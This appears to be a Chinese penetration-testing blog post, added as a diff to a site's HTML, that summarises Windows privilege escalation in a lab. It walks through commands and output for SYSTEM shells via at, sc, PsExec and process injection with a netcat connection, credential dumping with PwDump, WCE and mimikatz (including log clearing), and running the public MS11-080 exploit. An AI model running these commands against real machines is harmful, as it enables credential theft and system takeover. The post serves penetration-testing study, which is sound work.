@@ -260,6 +260,1067 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/" itemprop="url">渗透测试中常见提权方式总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:58:36+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul>
+<li>已实现本地低权限账号登录<ul>
+<li>远程溢出</li>
+<li>直接获得账号密码</li>
+</ul>
+</li>
+<li>希望获得更高权限<ul>
+<li>实现对目标进一步控制</li>
+</ul>
+</li>
+<li>系统账号之间权限隔离<ul>
+<li>操作系统安全的基础</li>
+<li>用户空间</li>
+<li>内核空间</li>
+</ul>
+</li>
+<li>系统账号<ul>
+<li>用户账号登录时获取权限令牌</li>
+<li>服务账号无需用户登录已在后台启动服务</li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>users</li>
+<li>Administrator</li>
+<li>System</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li>User</li>
+<li>Root</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-Windows系统提权"><a href="#1-Windows系统提权" class="headerlink" title="1.Windows系统提权"></a>1.Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin *
+ C:\Documents and Settings\kevin&gt;net user kevin *
+     Type a password for the user:
+     Retype the password to confirm:
+     The command completed successfully.
+
+ # 查看系统用户：net user
+ C:\Documents and Settings\kevin&gt;net user
+     User accounts for \\DH-CA8822AB9589
+     ---------------------------------------------------------------------
+     Administrator            Guest                    HelpAssistant
+     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin
+     SUPPORT_388945a0
+     The command completed successfully.
+
+ # 查看用户状态：
+ C:\Documents and Settings\kevin&gt;net user kevin
+     User name                    kevin
+     Full Name                    kevin
+     Comment
+     User&#39;s comment
+     Country code                 000 (System Default)
+     Account active               Yes
+     Account expires              Never
+
+     Password last set            2/28/2018 2:05 PM
+     Password expires             Never
+     Password changeable          2/28/2018 2:05 PM
+     Password required            Yes
+     User may change password     Yes
+
+     Workstations allowed         All
+     Logon script
+     User profile
+     Home directory
+     Last logon                   2/28/2018 2:03 PM
+
+     Logon hours allowed          All
+
+     Local Group Memberships      *Administrators       *Users
+     Global Group memberships     *None
+     The command completed successfully.
+</code></pre><p>1.查看用户进程</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt=""></p>
+<p>2.将 administrator 用户权限提升为 system 权限</p>
+<pre><code>  C:\Documents and Settings\administrator&gt;cd \
+  C:\&gt;at -?
+  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间
+      Added a new job with job ID = 1
+  C:\&gt;at
+  Status ID   Day                     Time          Command Line
+  ---------------------------------------------------------------------
+          1   Today                     2:15 AM       cmd
+</code></pre><p>我们看到这里弹出了system权限的命令框</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt=""></p>
+<p>3.用新的 system 权限的窗口启动任务管理器</p>
+<pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭之前的explorer</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt=""></p>
+<p>5.应用程序-&gt;新任务-&gt;explorer</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt=""></p>
+<p>6.验证桌面用户权限</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203554.png" alt=""></p>
+<h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p>
+<pre><code>- C:\Users\root&gt;cd \
+- C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact
+- C:&gt;sc start syscmd</code></pre><p>3.使用 Sysinternals Suite 套件</p>
+<p>推荐书籍 《Windows Internals第7版》</p>
+<p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p>
+<ul>
+<li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205521.png" alt=""></p>
+</li>
+<li><p>启动 PsExec.exe</p>
+</li>
+</ul>
+<pre><code>  C:\&gt;PsExec.exe
+  -i: 交互模式
+  -s: 使用系统账户
+
+  C:\&gt;psexec -p&#39;sei -s -d taskmgr
+  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul>
+<li>提权结果</li>
+</ul>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt=""></p>
+<h4 id="2-注入进程提权"><a href="#2-注入进程提权" class="headerlink" title="2.注入进程提权"></a>2.注入进程提权</h4><ul>
+<li>pinjector.exe</li>
+</ul>
+<p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p>
+<ul>
+<li>下载之后解压使用其中的 PsExec 放在C盘根目录</li>
+</ul>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205858.png" alt=""></p>
+<ul>
+<li>列出可注入进程及其信息<ul>
+<li>C:&gt;pinjector.exe</li>
+<li>C:&gt;pinjector.exe -l</li>
+</ul>
+</li>
+<li>找一个未使用端口<ul>
+<li>C:&gt;netstat -nao | find “4444” </li>
+<li>无结果表示未使用</li>
+</ul>
+</li>
+<li>选择一个进程注入</li>
+</ul>
+<pre><code>  C:\&gt;pinjector.exe -l
+      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM
+  C:\&gt;pinjector.exe -p 668 cmd 4444
+      Privilege Switcher for Win32(Private version)
+      (c) 2006 Andres Tarasco - atarasco@gmail.com
+      [+] Trying to execute cmd to 668 as: ? \
+      [+] Code inyected... ; )</code></pre><ul>
+<li>查看被注入的进程的监听状态</li>
+</ul>
+<pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;
+      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul>
+<li>利用此监听端口</li>
+</ul>
+<pre><code>  root@kali：~# nc -nv 192.168.153.143 4444
+      Connection to 10.10.10.128 555 port [tcp/*] succeeded!
+      Microsoft Windows XP [?汾 5.1.2600]
+      (C) ??????? 1985-2001 Microsoft Corp
+  C:\WINDOWS\system32&gt;whoami
+      whoami
+      SYSTEM</code></pre><ul>
+<li>查看进程</li>
+</ul>
+<pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><h4 id="3-读取windows本地密码"><a href="#3-读取windows本地密码" class="headerlink" title="3.读取windows本地密码"></a>3.读取windows本地密码</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
+<li>Windows<ul>
+<li>Wireshark</li>
+<li>Omnipeek</li>
+<li>Commview</li>
+<li>Sniffpass：抓取密码相关的数据包</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li>Tcpdump</li>
+<li>Wireshark</li>
+<li>Dsniff：抓取密码相关的数据包</li>
+</ul>
+</li>
+</ol>
+<h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul>
+<li>可以使用木马软件 DarkCometRAT</li>
+<li>在控制目标主机之后可以监控键盘记录信息</li>
+</ul>
+<h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul>
+<li>在浏览器查看缓存密码</li>
+</ul>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427211834.png" alt=""></p>
+<ul>
+<li><p>windows 密码恢复工具</p>
+<ul>
+<li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li>
+</ul>
+</li>
+<li><p>使用 Pwdump 查看 windows 本地登录密码</p>
+<ul>
+<li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li>
+<li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
+<li>添加用户</li>
+</ul>
+<pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add
+  C:\Documents and Settings\kevin&gt;net user
+      \\ICST-WINATT 的用户帐户
+      -------------------------------------------------------------
+      Administrator            Guest                    HelpAssistant
+      kevin                    SUPPORT_388945a0         test
+      user1                    user2
+  C:\Documents and Settings\kevin&gt;cd \
+  C:\&gt;PwDump.exe localhost
+      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::
+      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::
+      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
+      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::
+      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
+      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
+      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.
+  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH
+</code></pre><ul>
+<li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
+<li>WINDOWS身份认证过程</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul>
+<li>windows 内核中保存有密码明文副本，安全机制较低</li>
+<li>需要管理员权限</li>
+<li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li>
+<li>多用户登录目标主机</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li>列举登录账号及会话</li>
+</ul>
+<pre><code>  C:\&gt;wce-universal.exe -lv
+      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul>
+<li><p>每隔5秒刷新一次</p>
+<ul>
+<li>wce-universal.exe -r</li>
+</ul>
+</li>
+<li><p>删除登录会话</p>
+<pre><code>  C:\&gt;wce-universal.exe -d 0020B19D
+  C:\&gt;wce-universal.exe -lv
+      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+</code></pre></li>
+<li><p>计算密码对应的 HASH 值</p>
+</li>
+</ul>
+<pre><code>  C:\&gt;wce-universal.exe -g passwd
+      Password:   passwd
+      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul>
+<li>读取内核中的明文密码</li>
+</ul>
+<pre><code>  C:\&gt;wce-universal.exe -w
+      user1\ICST-WINATT:123456
+      user2\ICST-WINATT:123456
+      test\ICST-WINATT:123456
+      kevin\ICST-WINATT:123456
+      NETWORK SERVICE\MSHOME:
+
+  C:\&gt;net user user1 111222
+      命令成功完成。
+  C:\&gt;wce-universal.exe -w
+      user1\ICST-WINATT:123456
+      user2\ICST-WINATT:123456
+      test\ICST-WINATT:123456
+      kevin\ICST-WINATT:123456
+      NETWORK SERVICE\MSHOME:
+  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul>
+<li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li>
+</ul>
+<pre><code>  C:\&gt;wce-universal.exe -lv
+      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      Changing NTLM credentials of logon session 001E5D92h to:
+      Username: kevin
+      domain: ICST-WINATT
+      LMHash: 44EFCE164AB921CAAAD3B435B51404EE
+      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4
+      NTLM credentials successfully changed!
+  C:\&gt;wce-universal.exe -lv
+      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
+      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul>
+<li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p>
+<ul>
+<li>防范方法：修改注册表</li>
+</ul>
+<pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul>
+<li>删除 wdigest 之后重启计算机</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul>
+<li>PwDump localhost<ul>
+<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
+</ul>
+</li>
+<li>fgdump<ul>
+<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul>
+<li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li>
+</ul>
+<pre><code>  C:\Win32&gt;mimikatz.exe
+  查看帮助是：：
+  mimikatz # ::
+              standard  -  Standard module  [Basic commands (does not require module name)]
+                crypto  -  Crypto Module
+              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+              kerberos  -  Kerberos package module  []
+             privilege  -  Privilege module
+               process  -  Process module
+               service  -  Service module
+               lsadump  -  LsaDump module
+                    ts  -  Terminal Server module
+                 event  -  Event module
+                  misc  -  Miscellaneous module
+                 token  -  Token manipulation module
+                 vault  -  Windows Vault/Credential module
+           minesweeper  -  MineSweeper module
+                   net  -
+                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+             busylight  -  BusyLight Module
+                sysenv  -  System Environment Value module
+                   sid  -  Security Identifiers module
+                   iis  -  IIS XML Config module
+                   rpc  -  RPC control of mimikatz            
+  mimikatz # privilege::
+              Module :        privilege
+              Full name :     Privilege module
+
+                 debug  -  Ask debug privilege            * *
+                driver  -  Ask load driver privilege
+              security  -  Ask security privilege
+                   tcb  -  Ask tcb privilege
+                backup  -  Ask backup privilege
+               restore  -  Ask restore privilege
+                sysenv  -  Ask system environment privilege
+                    id  -  Ask a privilege by its id
+                  name  -  Ask a privilege by its name
+  mimikatz # privilege::debug
+  mimikatz # sekurlsa::
+  mimikatz # sekurlsa::logonPasswords
+  mimikatz # sekurlsa::wdigest
+  mimikatz # process::list
+  mimikatz # lsadump::sam
+  mimikatz # lsadump::cache
+  mimikatz # ts::multirdp
+  mimikatz # event::clear
+  mimikatz # event::drop
+  mimikatz # misc::regedit
+  mimikatz # token::whoami</code></pre><h3 id="提权——利用漏洞提权"><a href="#提权——利用漏洞提权" class="headerlink" title="提权——利用漏洞提权"></a>提权——利用漏洞提权</h3><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
+<li><p>Ms011-080 对应补丁 Kb2592799</p>
+<p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<pre><code> root@kali:~# searchsploit Ms11-080
+     ------------------------------------------ --------------------------------
+      Exploit Title                            |  Path
+                                               | (/usr/share/exploitdb/)
+     ------------------------------------------ --------------------------------
+     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb
+     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py
+     ------------------------------------------ --------------------------------
+
+ root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py .
+
+ # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)
+ # 首先查看 WinXP 是否安装了 对应更新 Kb2592799
+ WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p> 查看 WinXP下的文件路径</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p>
+<pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>  启动任务管理器</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>  结束 kevin 权限的 explorer 桌面程序</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>  输入 explorer</p>
+<p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p>
+<p>  启动 system 权限的 explorer 桌面程序</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2.WinXP 无需安装 Pyhon 的运行环境</p>
+<pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包
+  root@kali:~# apt-get install python-pip
+  root@kali:~# pip install pyinstaller
+  # 或者 WinXP 下，安装 python2.7
+  C:\&gt;pyinstaller --onefile 18176.py
+      297 INFO: Building EXE from out00-EXE.toc
+      297 INFO: Appending archive to EXE C:\dist\18176.exe
+      328 INFO: Building EXE from out00-EXE.toc completed successfully.
+</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>  # 打开文件目录，将文件复制到目标主机
+  C:\&gt;whoami
+      test
+  C:\&gt;net user test
+      本地组成员             *Users
+      全局组成员             *None
+  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>     C:\&gt;cd 111
+     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>     C:\WINDOWS\system32&gt;whoami
+         SYSTEM
+     # 将自己添加为管理员组
+     C:\WINDOWS\system32&gt;net localgroup administrators test /add
+         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
+<h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul>
+<li><p>使用 win2003 搭建域控制器</p>
+<ul>
+<li><p>配置并连接域控制器</p>
+<ul>
+<li>运行 -&gt; dcpromo</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址
+     # Win2003 设置强密码
+     C:\&gt;net user Administrator jlcssadmin2006...
+
+     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址
+     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
